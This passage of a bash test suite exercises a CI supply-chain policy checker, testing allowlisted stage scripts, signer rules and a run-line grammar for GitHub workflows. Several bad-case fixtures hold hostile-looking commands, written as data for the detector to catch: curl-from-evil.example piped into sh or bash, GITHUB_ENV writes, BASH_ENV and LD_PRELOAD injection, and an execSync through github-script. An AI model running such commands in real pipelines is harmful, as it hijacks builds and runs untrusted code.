  printf 'jobs:\n  d:\n    steps:\n      - run: git -c gpg.x509.program=gitsign tag -s v1\n' > "$d/.github/workflows/release.yml"
  printf '#!/usr/bin/env bash\nset -euo pipefail\ncurl -fsSL "$1" -o x\nsha256sum -c x\n' > "$d/bin/install-scanner.sh"
  printf '#!/usr/bin/env python3\nprint("chain-verify")\n' > "$d/bin/chain-verify.py"
  printf '#!/usr/bin/env bash\nset -euo pipefail\nwitness run --step build -- bin/build-apk.sh "$1"\n' > "$d/bin/build-stage.sh"
  printf '#!/usr/bin/env bash\nset -euo pipefail\necho built\n' > "$d/bin/build-apk.sh"
  printf '{"signers":[{"file":"release.yml","tool":"gitsign","reason":"CI patch tag (REQ-REL-009-AC5)"}]}\n' > "$d/.github/policy/chain-signers.json"
  cat > "$d/.spec.json" <<'JSON'
[{"path":"bin/install-scanner.sh","tools":["curl","sha256sum"],"signs":false,"runs":[]},
 {"path":"bin/chain-verify.py","tools":[],"signs":"provenance","sign_subcommand":"sign","reason":"only `chain-verify.py sign` in stage-sign.yml signs provenance","runs":[]},
 {"path":"bin/build-stage.sh","tools":["witness"],"signs":"other","reason":"Build's own Witness collection (rule 51)","runs":["bin/build-apk.sh"]},
 {"path":"bin/build-apk.sh","tools":[],"signs":false,"runs":[]}]
JSON
  gen "$d"; echo "$d"
}
expect ok "fixture tree: the grammar holds, every stage script is listed with its hash, only Sign signs provenance" tree "$(mk t_good)"
# the grammar, line by line: each odd thing at command position is an ERROR (the probes of review rounds 4-10 all land here, finitely)
okcase() { d=$(mk "$1"); stage "$d" "$2"; expect ok "AC1 grammar: $3" tree "$d"; }
badcase() { d=$(mk "$1"); stage "$d" "$2"; expect caught "AC1 grammar: $3" tree "$d"; }
okcase g_ok1 $'set -euo pipefail\nbash bin/build-stage.sh apk' "set -euo pipefail then a listed script"
okcase g_ok2 $'bash bin/build-stage.sh \\\n  --flag=1 \\\n  two' "a continued line with literal arguments"
okcase g_ok3 $'python3 bin/chain-verify.py stage-start --stage rebuild --previous build --record r.json' "chain-verify.py stage-start from a non-Sign stage (only its sign subcommand is a signer)"
badcase g_var1 'bash "$S"' 'a variable as the script path (bash "$S")'
badcase g_var2 '"$S"' 'a variable at command position ("$S")'
badcase g_var3 '$S' 'a bare variable at command position ($S)'
badcase g_var4 '${S}' 'a braced variable at command position (${S})'
badcase g_var5 'sudo "$S"' 'sudo before a variable'
badcase g_var6 'bash "$GITHUB_WORKSPACE/bin/build-stage.sh"' 'a workspace-prefixed variable path'
badcase g_glob1 'bash bin/build-s*.sh' 'a glob in the script path'
badcase g_glob2 "find bin -name 's*.sh' -exec sh {} +" 'find -exec'
badcase g_make 'make sign' 'make'
badcase g_xargs1 'cat bin/list.txt | xargs -n1 bash' 'xargs fed by a pipe'
badcase g_xargs2 'xargs bash < bin/list.txt' 'xargs from a redirect'
badcase g_runparts 'run-parts bin/release.d' 'run-parts'
badcase g_npm 'npm run sign' 'npm run'
badcase g_pipe 'cat bin/build-stage.sh | bash' 'a pipe into a shell'
badcase g_bare 'bin/release-sign' 'an extensionless path called directly'
badcase g_dotslash './bin/build-stage.sh' 'a ./ script called directly'
badcase g_dotbash 'bash ./bin/build-stage.sh' 'a ./ path after bash (the path must be a plain relative literal)'
badcase g_semi 'bash bin/build-stage.sh a; bash bin/build-apk.sh' 'two commands joined with ;'
badcase g_and 'bash bin/build-stage.sh a && bash bin/build-apk.sh' 'two commands joined with &&'
badcase g_subst 'bash bin/build-stage.sh $(echo x)' 'a command substitution argument'
badcase g_btick 'bash bin/build-stage.sh `echo x`' 'a backtick argument'
badcase g_expr 'bash bin/build-stage.sh "${{ inputs.x }}"' 'an expression in the run text (args reach a script only through env:)'
badcase g_noenv 'bash bin/build-stage.sh "$X"' 'a "$NAME" read of something that is not in the step env:'
badcase g_cosign 'cosign sign --yes "$IMG"' 'a direct signing tool in a stage file'
badcase g_gh 'gh release create v1' 'a direct gh call'
badcase g_echo 'echo "a << b"' 'a quoted << string is just an unlisted command (nothing is swallowed)'
badcase g_echo2 "echo 'x<<y'" 'a single-quoted << string'
badcase g_dots 'bash ../bin/build-stage.sh' 'a .. path'
badcase g_abs 'bash /opt/x/run.sh' 'an absolute path'
badcase g_unlisted 'bash bin/unlisted.sh' 'an unlisted script'
badcase g_pym 'python3 -m tools.pub' 'python -m'
badcase g_pyc 'python3 -c "import os"' 'python -c'
badcase g_flag 'bash -x bin/build-stage.sh' 'a bash flag before the script'
badcase g_export $'export S=bin/build-stage.sh\nbash "$S"' 'export then a variable path'
badcase g_cond1 $'[ -n "$S" ] || S=bin/clean.sh\nbash "$S"' 'a conditional default (||)'
badcase g_cond2 $'test -z "$S" && S=bin/clean.sh\nbash "$S"' 'a conditional default (&&)'
badcase g_cond3 $'if [ -z "$S" ]; then S=bin/clean.sh; fi\nbash $S' 'a conditional default (if)'
badcase g_cond4 $'case "$1" in a) S=bin/clean.sh;; esac\nbash "$S"' 'a conditional default (case)'
badcase g_ghenv 'echo "S=bin/evil.sh" >> "$GITHUB_ENV"' 'a GITHUB_ENV write'
badcase g_heredoc $'bash bin/build-stage.sh <<EOF\nx\nEOF' 'a heredoc into a script'
badcase g_herestr 'bash bin/build-stage.sh <<< word' 'a here-string'
d=$(mk g_envok); printf 'jobs:\n  j:\n    steps:\n      - env:\n          V: ${{ inputs.v }}\n        run: bash bin/build-stage.sh "$V"\n' > "$d/.github/workflows/stage-verify.yml"
expect ok "AC1 grammar: a whole \"\$NAME\" read of the step's own env:" tree "$d"
d=$(mk g_shell); printf 'jobs:\n  j:\n    steps:\n      - shell: python\n        run: bash bin/build-stage.sh a\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 grammar: a step shell other than bash" tree "$d"
d=$(mk g_wd); printf 'jobs:\n  j:\n    steps:\n      - working-directory: bin\n        run: bash build-stage.sh a\n' > "$d/.github/workflows/stage-verify.yml"
expect caught "AC1 grammar: working-directory reroutes every path" tree "$d"
d=$(mk g_sign1); stage "$d" 'python3 bin/chain-verify.py sign --check --digests digests.json'
expect caught "AC1 grammar: chain-verify.py sign anywhere but stage-sign.yml is a second provenance signer" tree "$d"
d=$(mk g_nonstage); printf 'on: push\njobs:\n  j:\n    steps:\n      - run: make test\n      - run: cat x | bash\n' > "$d/.github/workflows/ci.yml"
expect ok "AC1 scope: ci.yml and other non-stage workflows keep only the direct signer-call scan (make, pipes are not judged)" tree "$d"
# the allowlist file itself
d=$(mk l_nolist); rm "$d/.github/policy/chain-scripts.json"; expect caught "AC1 allowlist: no chain-scripts.json" tree "$d"
d=$(mk l_hash); setfile "$d" bin/build-apk.sh '#!/usr/bin/env bash\nset -euo pipefail\necho changed\n'; expect caught "AC1 allowlist: a listed script whose sha256 no longer matches" tree "$d"
d=$(mk l_gone); python3 - "$d" <<'PY'
import json, sys
f = sys.argv[1] + "/.github/policy/chain-scripts.json"; j = json.load(open(f)); j["scripts"].append({"path": "bin/ghost.sh", "sha256": "0" * 64, "tools": [], "signs": False, "runs": []}); json.dump(j, open(f, "w"))
PY
expect caught "AC1 allowlist: a row for a file that is not in the tree" tree "$d"
d=$(mk l_dots); python3 - "$d" <<'PY'
import json, sys
f = sys.argv[1] + "/.github/policy/chain-scripts.json"; j = json.load(open(f)); j["scripts"].append({"path": "bin/../x.sh", "sha256": "0" * 64, "tools": [], "signs": False, "runs": []}); json.dump(j, open(f, "w"))
PY
expect caught "AC1 allowlist: a row path with .." tree "$d"
d=$(mk l_noreason); edit_spec "$d" 'rows["bin/build-stage.sh"]["reason"]=""'; expect caught "AC1 allowlist: a signing script with no reason" tree "$d"
d=$(mk l_badsigns); edit_spec "$d" 'rows["bin/build-stage.sh"]["signs"]="maybe"'; expect caught "AC1 allowlist: signs must be false, provenance or other" tree "$d"
d=$(mk l_runs); edit_spec "$d" 'rows["bin/build-stage.sh"]["runs"].append("bin/nothere.sh")'; expect caught "AC1 allowlist: runs names an unlisted script" tree "$d"
d=$(mk l_dup); python3 - "$d" <<'PY'
import json, sys
f = sys.argv[1] + "/.github/policy/chain-scripts.json"; j = json.load(open(f)); j["scripts"].append(dict(j["scripts"][0])); json.dump(j, open(f, "w"))
PY
expect caught "AC1 allowlist: a script listed twice" tree "$d"
# listed scripts: tools, runs, signing
scriptcase() { # scriptcase LABEL expect CONTENT [python edit_spec statements]
  d=$(mk "$1"); setfile "$d" bin/build-stage.sh "$3"; edit_spec "$d" "${4:-pass}"; expect "$2" "AC1 script: $5" tree "$d"
}
S0='#!/usr/bin/env bash\nset -euo pipefail\n'
scriptcase s_ok ok "${S0}witness run --step build -- bin/build-apk.sh \"\$1\"\n" '' "the good script (tool witness, runs bin/build-apk.sh)"
scriptcase s_bash caught "${S0}bash bin/build-apk.sh\n" 'rows["bin/build-stage.sh"]["tools"]=["witness"]' "starts another script with bash"
scriptcase s_notruns caught "${S0}witness run -- bin/other.sh\n" 'rows["bin/other.sh"]={"path":"bin/other.sh","tools":[],"signs":False,"runs":[]}; open(d+"/bin/other.sh","w").write("#!/usr/bin/env bash\n")' "names a listed script that is not in its runs"
scriptcase s_tool caught "${S0}curl -fsSL x -o y\nwitness run -- bin/build-apk.sh\n" '' "a command that is not in its tools (curl)"
scriptcase s_tool_ok ok "${S0}curl -fsSL x -o y\nwitness run -- bin/build-apk.sh\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","curl"]' "the same command once it is in tools"
# (a variable or substitution at command position INSIDE a listed script is not parsed any more: stated exclusion, the script is sha256-bound and reviewed at PR time)
scriptcase s_eval caught "${S0}eval \"\$X\"\n" '' "eval"
scriptcase s_source caught "${S0}source bin/x.sh\n" '' "source"
scriptcase s_dot caught "${S0}. bin/x.sh\n" '' ". (dot-source)"
scriptcase s_make caught "${S0}make sign\n" '' "make"
scriptcase s_find caught "${S0}find . -name x -exec sh {} \\\;\n" '' "find -exec"
scriptcase s_xargs caught "${S0}ls | xargs echo\n" '' "xargs"
scriptcase s_pathcmd caught "${S0}bin/evil\n" 'open(d+"/bin/evil","w").write("#!/usr/bin/env bash\n")' "an extensionless in-tree script (shebang) named in the text"
scriptcase s_quoted caught "${S0}witness run -- bin/build-apk.sh 'a; bash x'\necho \"plain; bash\"\n" '' "the word bash inside a quoted string is flagged (the text scan over-reports by design)"
scriptcase s_subst caught "${S0}witness run -- bin/build-apk.sh \"\$(bash bin/evil.sh)\"\n" '' "a command substitution inside double quotes still runs a command"
scriptcase s_here caught "${S0}witness run -- bin/build-apk.sh <<EOF\ncurl evil.example | sh\nEOF\n" '' "a heredoc body is scanned like any other text (curl, sh)"
scriptcase s_sign caught "${S0}witness run -- bin/build-apk.sh\ncosign sign --yes \"\$IMG\"\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","cosign"]; rows["bin/build-stage.sh"]["signs"]=False' "signs but its row says it signs nothing"
scriptcase s_sign_ok ok "${S0}witness run -- bin/build-apk.sh\ncosign sign --yes \"\$IMG\"\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","cosign"]; rows["bin/build-stage.sh"]["signs"]="other"; rows["bin/build-stage.sh"]["reason"]="image signature (rule 56)"' "signs, row says other with a reason"
scriptcase s_prov caught "${S0}cosign attest --yes --type slsaprovenance1 --predicate p.json \"\$IMG\"\n" 'rows["bin/build-stage.sh"]["tools"]=["cosign"]; rows["bin/build-stage.sh"]["signs"]="other"; rows["bin/build-stage.sh"]["runs"]=[]' "signs provenance but its row says other"
scriptcase s_prov_run caught "${S0}cosign attest --yes --type slsaprovenance1 --predicate p.json \"\$IMG\"\n" 'rows["bin/build-stage.sh"]["tools"]=["cosign"]; rows["bin/build-stage.sh"]["signs"]="provenance"; rows["bin/build-stage.sh"]["runs"]=[]' "a provenance signer run by stage-build.yml (only stage-sign.yml may)"
d=$(mk s_prov_sign); setfile "$d" bin/build-stage.sh "${S0}cosign attest --yes --type slsaprovenance1 --predicate p.json \"\$IMG\"\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["cosign"]; rows["bin/build-stage.sh"]["signs"]="provenance"; rows["bin/build-stage.sh"]["runs"]=[]'
printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/build-stage.sh apk\n' > "$d/.github/workflows/stage-sign.yml"; printf 'jobs:\n  b:\n    steps:\n      - run: set -euo pipefail\n' > "$d/.github/workflows/stage-build.yml"
expect ok "AC1 script: the same provenance signer run only by stage-sign.yml" tree "$d"
d=$(mk s_trans); printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/build-stage.sh a\n' > "$d/.github/workflows/stage-verify.yml"; setfile "$d" bin/prov.sh "${S0}cosign attest --yes --type slsaprovenance1 --predicate p.json \"\$IMG\"\n"
edit_spec "$d" 'rows["bin/prov.sh"]={"path":"bin/prov.sh","tools":["cosign"],"signs":"provenance","reason":"x","runs":[]}; rows["bin/build-stage.sh"]["runs"].append("bin/prov.sh")'
setfile "$d" bin/build-stage.sh "${S0}witness run -- bin/build-apk.sh\nwitness run -- bin/prov.sh\n"; gen "$d"; printf 'jobs:\n  b:\n    steps:\n      - run: bash bin/build-stage.sh apk\n' > "$d/.github/workflows/stage-build.yml"
expect caught "AC1 script: a provenance signer reached through a listed script's runs from a non-Sign stage" tree "$d"
d=$(mk s_py); setfile "$d" bin/build-apk.sh '#!/usr/bin/env bash\n'; printf '#!/usr/bin/env python3\nimport subprocess\nsubprocess.run(["cosign","sign","x"])\ncosign sign --yes x\n' > "$d/bin/signer.py"
edit_spec "$d" 'rows["bin/signer.py"]={"path":"bin/signer.py","tools":[],"signs":False,"runs":[]}'
expect caught "AC1 script: a python script that signs while its row says it signs nothing" tree "$d"

# ---- round 11b (advisor decision b): the key set, the uses list, printf, and the text scan of listed scripts. Every probe of both final-round
# reports (Sonnet 1-12, Opus P1-P11) is a named error case; the ok controls show the legitimate shapes still pass.
ycase() { d=$(mk "$1"); sed "s/@SHA/@$sha/g" > "$d/.github/workflows/stage-verify.yml"; expect "${3:-caught}" "AC1 keys: $2" tree "$d"; }
ycase y_ok_matrix "a matrix job on literal runner labels with a listed script, checkout, artifacts" ok <<'EOF'
jobs:
  apk:
    runs-on: ${{ matrix.runner }}
    strategy:
      fail-fast: true
      matrix:
        runner: [ubuntu-24.04, ubuntu-24.04-arm]
    steps:
      - uses: actions/checkout@SHA
        with:
          persist-credentials: false
      - uses: actions/download-artifact@SHA
        with:
          name: dist
          path: dl
      - run: bash bin/build-stage.sh apk
      - uses: actions/upload-artifact@SHA
        with:
          name: out
          path: out
EOF
ycase y_ok_printf "printf '%s' \"\$NAME\" > digests.json with the name in env_names" ok <<'EOF'
jobs:
  j:
    steps:
      - env:
          DIGESTS: ${{ inputs.digests }}
        run: printf '%s' "$DIGESTS" > digests.json
EOF
ycase y_wfdefaults "workflow-level defaults.run.shell (Sonnet 1)" <<'EOF'
defaults:
  run:
    shell: "bash -c 'bash bin/unlisted.sh; bash {0}'"
jobs:
  j:
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_jobdefaults "job-level defaults.run.shell (Sonnet 1, Opus P4)" <<'EOF'
jobs:
  j:
    defaults:
      run:
        shell: "bash -c 'bash bin/unlisted.sh; bash {0}'"
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_wfdefaults_wd "workflow-level defaults.run.working-directory (Opus P4b)" <<'EOF'
defaults:
  run:
    working-directory: evil
jobs:
  j:
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_wfenv "workflow-level env BASH_ENV (Sonnet 3)" <<'EOF'
env:
  BASH_ENV: bin/unlisted.sh
jobs:
  j:
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_jobenv "job-level env (Opus B3)" <<'EOF'
jobs:
  j:
    env:
      X1: y
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_bashenv "step env BASH_ENV carrying code (Sonnet 3, Opus P3)" <<'EOF'
jobs:
  j:
    steps:
      - env:
          BASH_ENV: bin/evil.sh
        run: bash bin/build-stage.sh a
EOF
ycase y_path "step env PATH: ./bin (Sonnet 4)" <<'EOF'
jobs:
  j:
    steps:
      - env:
          PATH: ./bin
        run: bash bin/build-stage.sh a
EOF
ycase y_pythonpath "step env PYTHONPATH (Opus P10)" <<'EOF'
jobs:
  j:
    steps:
      - env:
          PYTHONPATH: evil
        run: python3 bin/chain-verify.py stage-start --stage rebuild
EOF
ycase y_ldpreload "step env LD_PRELOAD" <<'EOF'
jobs:
  j:
    steps:
      - env:
          LD_PRELOAD: bin/evil.so
        run: bash bin/build-stage.sh a
EOF
ycase y_envname "step env name not in the closed env_names list" <<'EOF'
jobs:
  j:
    steps:
      - env:
          FOO: bar
        run: bash bin/build-stage.sh "$FOO"
EOF
ycase y_envunread "step env key the run line does not read whole" <<'EOF'
jobs:
  j:
    steps:
      - env:
          V: ${{ inputs.v }}
        run: bash bin/build-stage.sh a
EOF
ycase y_composite "uses: ./.github/actions/x, a local composite action (Sonnet 5, Opus P5)" <<'EOF'
jobs:
  j:
    steps:
      - uses: ./.github/actions/x
EOF
ycase y_docker "uses: docker://alpine (Sonnet 6)" <<'EOF'
jobs:
  j:
    steps:
      - uses: docker://alpine
EOF
ycase y_ghscript "a digest-pinned actions/github-script whose script runs a program (Sonnet 12)" <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/github-script@SHA
        with:
          script: require('child_process').execSync('bin/unlisted.sh')
EOF
ycase y_unpinned "an unpinned action" <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
EOF
ycase y_jobuses "a job-level reusable-workflow call to ci.yml (Sonnet 7, Opus P9)" <<'EOF'
jobs:
  j:
    uses: ./.github/workflows/ci.yml
EOF
ycase y_container "job container: (Sonnet 11, Opus P11)" <<'EOF'
jobs:
  j:
    container: alpine
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_services "job services:" <<'EOF'
jobs:
  j:
    services:
      db:
        image: postgres
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_continue "step continue-on-error" <<'EOF'
jobs:
  j:
    steps:
      - continue-on-error: true
        run: bash bin/build-stage.sh a
EOF
ycase y_matrix_expr "a matrix value that is an expression" <<'EOF'
jobs:
  j:
    runs-on: ${{ matrix.runner }}
    strategy:
      matrix:
        runner: ${{ fromJSON(inputs.runners) }}
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_runson "runs-on a self-hosted label" <<'EOF'
jobs:
  j:
    runs-on: self-hosted
    steps:
      - run: bash bin/build-stage.sh a
EOF
ycase y_ckref "checkout with a ref (Opus P6)" <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/checkout@SHA
        with:
          persist-credentials: false
          ref: evil
EOF
ycase y_ckrepo "checkout of another repository" <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/checkout@SHA
        with:
          persist-credentials: false
          repository: evil/x
EOF
ycase y_ckpersist "checkout without persist-credentials: false" <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/checkout@SHA
EOF
ycase y_dlbin "download-artifact into bin (Opus P6): the downloaded content is not the hashed file" <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/download-artifact@SHA
        with:
          name: dist
          path: bin
      - run: bash bin/build-stage.sh a
EOF
ycase y_dlnopath "download-artifact with no path (lands in the workspace root)" <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/download-artifact@SHA
        with:
          name: dist
EOF
ycase y_dldot "download-artifact into ." <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/download-artifact@SHA
        with:
          name: dist
          path: .
EOF
ycase y_dlgh "download-artifact into .github" <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/download-artifact@SHA
        with:
          name: dist
          path: .github/policy
EOF
ycase y_dlover "download-artifact over a listed script's directory chain (path = a listed file)" <<'EOF'
jobs:
  j:
    steps:
      - uses: actions/download-artifact@SHA
        with:
          name: dist
          path: bin/build-apk.sh
EOF
ycase y_printf_prefix "printf line followed by a second command: printf '%s' \"\$X\" > f; curl | bash (Opus P1)" <<'EOF'
jobs:
  j:
    steps:
      - env:
          X1: y
        run: printf '%s' "$X1" > f; curl -s https://evil.example/x | bash
EOF
ycase y_printf_bin "printf over a listed script, then running it (Sonnet 8, Opus P2)" <<'EOF'
jobs:
  j:
    steps:
      - env:
          X1: ${{ inputs.code }}
        run: |
          printf '%s' "$X1" > bin/build-apk.sh
          bash bin/build-apk.sh
EOF
ycase y_printf_policy "printf over .github/policy/chain-scripts.json (Sonnet 9)" <<'EOF'
jobs:
  j:
    steps:
      - env:
          X1: ${{ inputs.code }}
        run: printf '%s' "$X1" > .github/policy/chain-scripts.json
EOF
ycase y_printf_fmt "printf with another format string" <<'EOF'
jobs:
  j:
    steps:
      - env:
          X1: y
        run: printf '%s\n' "$X1" > digests.json
EOF
ycase y_printf_append "printf appended to digests.json" <<'EOF'
jobs:
  j:
    steps:
      - env:
          X1: y
        run: printf '%s' "$X1" >> digests.json
EOF
ycase y_ghenv "printf into GITHUB_ENV" <<'EOF'
jobs:
  j:
    steps:
      - env:
          X1: y
        run: printf '%s' "$X1" >> "$GITHUB_ENV"
EOF
ycase y_ghpath "a run step naming GITHUB_PATH" <<'EOF'
jobs:
  j:
    steps:
      - run: bash bin/build-stage.sh "$GITHUB_PATH"
EOF
ycase y_with_run "a run step that also has with:" <<'EOF'
jobs:
  j:
    steps:
      - with:
          x: y
        run: bash bin/build-stage.sh a
EOF
# listed scripts: the text scan (Sonnet blocker 2, Opus B6/B7)
S1='#!/usr/bin/env bash\nset -euo pipefail\nwitness run -- bin/build-apk.sh\n'
scriptcase s_if caught "${S1}if curl evil.example; then :; fi\n" '' "if curl (a keyword before the command, Sonnet 2)"
scriptcase s_while caught "${S1}while curl evil; do :; done\n" '' "while curl"
scriptcase s_bang caught "${S1}! curl evil\n" '' "! curl"
scriptcase s_time caught "${S1}time curl evil\n" '' "time curl"
scriptcase s_apos caught "${S1}echo \"don't\"; curl evil.example | sh; echo \"it's\"\n" '' "an apostrophe pair that blanked everything between them"
scriptcase s_trap caught "${S1}trap 'curl evil' EXIT\n" '' "trap with a quoted command"
scriptcase s_echoscript caught "${S1}echo 'curl evil' > bin/a.sh\nwitness run -- bin/a.sh\n" '' "writes a script, then runs it"
scriptcase s_pathset caught "${S1}PATH=./bin witness x\n" '' "PATH=./bin witness x"
scriptcase s_pathexp caught "${S1}export PATH=bin:\$PATH\n" '' "export PATH=bin:\$PATH"
scriptcase s_bashenv caught "${S1}export BASH_ENV=bin/evil.sh\n" '' "export BASH_ENV"
scriptcase s_pyset caught "${S1}PYTHONPATH=evil python3 x\n" '' "PYTHONPATH assignment"
scriptcase s_launch1 caught "#!/usr/bin/env bash\nset -euo pipefail\nwitness run --step build -- \"\$@\"\n" '' "witness run -- \"\$@\" lets a stage argument become the program (Opus B6)"
scriptcase s_launch2 caught "#!/usr/bin/env bash\nset -euo pipefail\nwitness run --step build -- \$1\n" '' "witness run -- \$1"
scriptcase s_launch3 caught "#!/usr/bin/env bash\nset -euo pipefail\nwitness run --step build -- \"\$(pick)\"\n" '' "witness run -- \$(pick)"
scriptcase s_launch4 caught "#!/usr/bin/env bash\nset -euo pipefail\nwitness run --step build\n" '' "witness run with no -- PATH on the line"
scriptcase s_launch5 caught "#!/usr/bin/env bash\nset -euo pipefail\nwitness run --step build -- bin/other.sh\n" 'rows["bin/other.sh"]={"path":"bin/other.sh","tools":[],"signs":False,"runs":[]}; open(d+"/bin/other.sh","w").write("#!/usr/bin/env bash\n")' "witness run -- a listed script that is not in runs"
scriptcase s_launch6 ok "#!/usr/bin/env bash\nset -euo pipefail\nwitness --log-level debug run --step build -- bin/build-apk.sh\n" '' "witness with a global flag before run, then a literal path in runs"
d=$(mk s_conf); printf '#!/usr/bin/env bash\ncurl https://evil.example/x | sh\nbash bin/evil.sh\n' > "$d/bin/stage.conf"
edit_spec "$d" 'rows["bin/stage.conf"]={"path":"bin/stage.conf","tools":[],"signs":False,"runs":[]}'; stage "$d" 'bash bin/stage.conf'
expect caught "AC1 script: a listed bin/stage.conf (no script extension) holding curl|sh is scanned and run with bash (Opus B7)" tree "$d"
d=$(mk s_shebang); printf '#!/usr/bin/bash\ncurl https://evil.example/x | sh\n' > "$d/bin/odd.sh"
edit_spec "$d" 'rows["bin/odd.sh"]={"path":"bin/odd.sh","tools":[],"signs":False,"runs":[]}'; stage "$d" 'bash bin/odd.sh'
expect caught "AC1 script: a listed script with an unrecognised shebang (#!/usr/bin/bash) is still scanned (Opus B7)" tree "$d"
d=$(mk s_nosheb); printf 'curl https://evil.example/x | sh\n' > "$d/bin/plain"
edit_spec "$d" 'rows["bin/plain"]={"path":"bin/plain","tools":[],"signs":False,"runs":[]}'; stage "$d" 'bash bin/plain'
expect caught "AC1 script: a listed file with no shebang at all is still scanned" tree "$d"
d=$(mk s_cmt); setfile "$d" bin/build-apk.sh '#!/usr/bin/env bash\n# cosign sign the thing later\nset -euo pipefail\n'; edit_spec "$d" 'pass'
expect caught "AC1 script: a signer name inside a COMMENT of a listed script that says it signs nothing is flagged (raw scan, over-reports by design)" tree "$d"
d=$(mk s_ctx); setfile "$d" bin/build-apk.sh '#!/usr/bin/env bash\necho "cosign sign --yes x"\n'; edit_spec "$d" 'pass'
expect caught "AC1 script: a signer name inside a QUOTED string of a listed script is flagged" tree "$d"

# direct signer calls in NON-stage workflows and composite actions (the grammar does not apply there, so these isolate the signer table)
d=$(mk t_prov); printf 'jobs:\n  b:\n    steps:\n      - uses: actions/attest-build-provenance@%s\n' "$sha" > "$d/.github/workflows/stage-build.yml"
expect caught "AC1 another stage signs provenance with the attest action" tree "$d"
for form in '-a slsa' '-a=slsa' '-a product,slsa' '--attestations slsa' '--attestations=slsa' '--attestor slsa'; do
  d=$(mk "t_slsa_$(printf '%s' "$form" | tr -c 'a-z' _)"); printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build %s -- ./bin/build.sh\n' "$form" > "$d/.github/workflows/scan.yml"
  expect caught "AC1 another stage signs provenance with Witness ($form)" tree "$d"
done
d=$(mk t_slsa_cont); printf 'jobs:\n  b:\n    steps:\n      - run: |\n          witness run --step build \\\n            -a slsa -- ./bin/build.sh\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 Witness slsa attestor on a continuation line" tree "$d"
d=$(mk t_cosprov); printf 'jobs:\n  b:\n    steps:\n      - run: cosign attest --yes --type slsaprovenance1 --predicate p.json "$IMG"\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 cosign attest of SLSA provenance in another stage" tree "$d"
d=$(mk t_comment_exempt); printf 'jobs:\n  b:\n    steps:\n      - run: cosign attest --yes --type slsaprovenance1 --predicate p.json "$IMG" # verify\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 a trailing '# verify' exempts nothing" tree "$d"
d=$(mk t_cvsign); printf 'jobs:\n  b:\n    steps:\n      - run: python3 bin/chain-verify.py sign --check --signer cosign --digests digests.json --build-record b.json --policy p.json --out provenance\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 chain-verify.py sign anywhere but stage-sign.yml is a second provenance signer" tree "$d"
d=$(mk t_sbom); printf 'jobs:\n  b:\n    steps:\n      - uses: actions/attest-sbom@%s # v3\n' "$sha" > "$d/.github/workflows/scan.yml"
expect caught "AC1 actions/attest-sbom is a known signer and must be listed (not provenance, but not free)" tree "$d"
d=$(mk t_slsagen); printf 'jobs:\n  b:\n    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@%s\n' "$sha" > "$d/.github/workflows/scan.yml"
expect caught "AC1 slsa-github-generator is a provenance signer" tree "$d"
d=$(mk t_unl); printf 'jobs:\n  b:\n    steps:\n      - run: cosign sign --yes "$IMG"\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 an unlisted signing call (cosign sign) in a stage file" tree "$d"
d=$(mk t_csign); printf 'jobs:\n  b:\n    permissions: {contents: read}\n    steps:\n      - run: python3 bin/chain-verify.py sign --check --signer cosign --digests d --build-record r --policy p --out o\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 chain-verify.py sign outside stage-sign.yml is a second signer even in a job without id-token (no exemption exists)" tree "$d"
d=$(mk t_cbr); printf 'jobs:\n  b:\n    permissions: {contents: read}\n    steps:\n      - run: python3 bin/chain-verify.py check-build-record --digests d --build-record r --policy p\n' > "$d/.github/workflows/scan.yml"
expect ok "AC1 chain-verify.py check-build-record is not a signer (the dry run's hand-code attempt uses it: the same refusals, no cosign)" tree "$d"
d=$(mk t_yaml); printf 'jobs:\n  b:\n    steps:\n      - run: cosign attest --predicate p.json "$IMG"\n' > "$d/.github/workflows/other.yaml"
expect caught "AC1 a .yaml workflow file is scanned too" tree "$d"
d=$(mk t_comp); printf 'runs:\n  using: composite\n  steps:\n    - run: cosign sign "$IMG"\n      shell: bash\n' > "$d/.github/actions/x/action.yml"
expect caught "AC1 a composite action is scanned too" tree "$d"
expect caught "AC1 a global flag before the subcommand does not hide the signer (witness --log-level debug run -a slsa)" tree "$d"
d=$(mk t_cflag); printf 'jobs:\n  b:\n    steps:\n      - run: cosign --verbose attest --yes --type slsaprovenance1 --predicate p.json "$IMG"\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 cosign --verbose attest of SLSA provenance" tree "$d"
d=$(mk t_aslsa); printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build -aslsa -- ./bin/build.sh\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 witness run -aslsa (shorthand with the value attached)" tree "$d"
d=$(mk t_wcfg); printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build -c witness.yaml -- ./bin/build.sh\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 witness run -c config with no explicit -a (the config file can list the slsa attestor): flagged" tree "$d"
